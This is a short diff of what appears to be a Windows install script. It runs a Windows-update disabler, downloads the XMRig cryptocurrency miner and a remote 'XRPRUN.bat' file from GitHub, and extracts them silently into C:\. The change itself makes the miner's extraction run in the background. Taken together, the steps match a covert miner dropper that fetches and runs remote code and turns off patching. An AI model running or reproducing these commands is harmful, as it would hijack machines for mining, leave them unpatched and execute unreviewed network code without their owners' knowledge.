@@ -6,7 +6,7 @@ powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -pPITVN
 powershell -NoProfile -Command "Start-Sleep -Seconds 2"
 powershell -NoProfile -Command "& 'C:\Disable-update-windows\Wub_x64.exe'"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip"
-powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -idq -o+ 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'"
+powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'"
 powershell -NoProfile -Command "Start-Sleep -Seconds 3"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPRUN.bat -OutFile C:\XRPRUN.bat"
 powershell -NoProfile -Command "Copy-Item -Path C:\XRPRUN.bat -Destination C:\xmrig-6.22.2\XRPRUN.bat -Force"
